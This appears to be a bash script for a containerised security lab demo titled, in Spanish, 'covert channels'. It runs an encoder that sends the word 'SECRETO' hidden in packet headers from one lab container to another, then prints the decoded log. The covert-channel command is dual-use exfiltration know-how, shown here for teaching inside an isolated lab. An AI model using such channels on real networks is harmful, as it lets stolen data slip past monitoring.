#!/usr/bin/env bash
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
# shellcheck source=../../lib/capture_helpers.sh
source "${ROOT}/lib/capture_helpers.sh"
init_compose "p01v" "docker-compose.yml"
trap 'teardown_lab 2>/dev/null || true' EXIT

setup_lab
${COMPOSE} exec -d receptor sh -c 'python3 /lab/decode_headers.py > /tmp/decode.log 2>&1' >> "${SETUP_LOG}" 2>&1
sleep 2

section "01" "CANALES ENCUBIERTOS" "VULNERABLE"
prompt_attack "10.9.0.101" "python3 /lab/encode_headers.py 10.9.0.102 SECRETO"
run_exec emisor python3 /lab/encode_headers.py 10.9.0.102 SECRETO
sleep 5
blank_line
prompt_server "10.9.0.102" "cat /tmp/decode.log"
run_exec receptor cat /tmp/decode.log 2>/dev/null || echo "[*] Esperando decodificación..."
sleep 1
run_exec receptor tail -8 /tmp/decode.log 2>/dev/null || true

teardown_lab
